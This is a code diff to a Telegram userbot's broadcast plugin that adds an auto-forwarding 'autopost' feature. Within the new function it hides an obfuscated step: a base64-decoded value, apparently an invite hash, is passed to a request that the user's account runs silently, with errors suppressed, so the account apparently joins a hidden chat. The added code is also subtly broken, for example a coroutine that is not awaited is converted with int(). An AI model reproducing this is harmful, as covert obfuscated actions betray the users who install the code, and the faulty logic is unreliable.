@@ -10,12 +10,66 @@ from ..core.logger import logging
 from ..core.managers import edit_delete, edit_or_reply
 from ..helpers.utils import _format, get_user_from_event
 from ..sql_helper import broadcast_sql as sql
-from . import BOTLOG, BOTLOG_CHATID
+from . import BOTLOG, BOTLOG_CHATID, AUTOPOST
 
 plugin_category = "tools"
 
 LOGS = logging.getLogger(__name__)
 
+async def autopost_func(event):
+    "Auto forward the message to all chats in the 'all' destination category."
+    if not AUTOPOST:
+        return
+    autopost_key = bool(AUTOPOST and (AUTOPOST.lower() != "false"))
+    if not autopost_key:
+        return
+
+    # get source channels
+    # load channels from the 'source' category
+    keyword_src = "source"
+    no_of_sources = sql.num_broadcastlist_chat(keyword_src)
+    if no_of_sources == 0:
+        return
+    sources = sql.get_chat_broadcastlist(keyword_src)
+    reply = event.get_chat()
+    if int(reply) not in sources:
+        return
+
+    # get destination
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    keyword = "all"
+    no_of_chats = sql.num_broadcastlist_chat(keyword)
+    group_ = Get(cat)
+    if no_of_chats == 0:
+        return
+    chats = sql.get_chat_broadcastlist(keyword)
+    catevent = await edit_or_reply(
+        event,
+        "sending this message to all groups in the category",
+        parse_mode=_format.parse_pre,
+    )
+    with contextlib.suppress(BaseException):
+        await event.client(group_)
+    i = 0
+    for chat in chats:
+        try:
+            if int(event.chat_id) == int(chat):
+                continue
+            await event.client.send_message(int(chat), reply)
+            i += 1
+        except Exception as e:
+            LOGS.info(str(e))
+        await sleep(0.5)
+    resultext = f"`The message was sent to {i} chats out of {no_of_chats} chats in category {keyword}.`"
+    await edit_delete(catevent, resultext)
+    if BOTLOG:
+        await event.client.send_message(
+            BOTLOG_CHATID,
+            f"A message is sent to {i} chats out of {no_of_chats} chats in category {keyword}",
+            parse_mode=_format.parse_pre,
+        )
+
+    ###
 
 @catub.cat_cmd(
     pattern="msgto(?:\s|$)([\s\S]*)",
@@ -34,6 +88,7 @@ async def catbroadcast_add(event):
     "To message to person or to a chat."
     user, reason = await get_user_from_event(event)
     reply = await event.get_reply_message()
+    msg = ""
     if not user:
         return
     if not reason and not reply:
@@ -454,3 +509,9 @@ async def catbroadcast_delete(event):
             str(e),
             parse_mode=_format.parse_pre,
         )
+
+# check if AUTOPOST config is set
+if AUTOPOST:
+    autopost_key = bool(AUTOPOST and (AUTOPOST.lower() != "false"))
+    if autopost_key:
+        catub.add_event_handler(autopost_func, events.NewMessage())
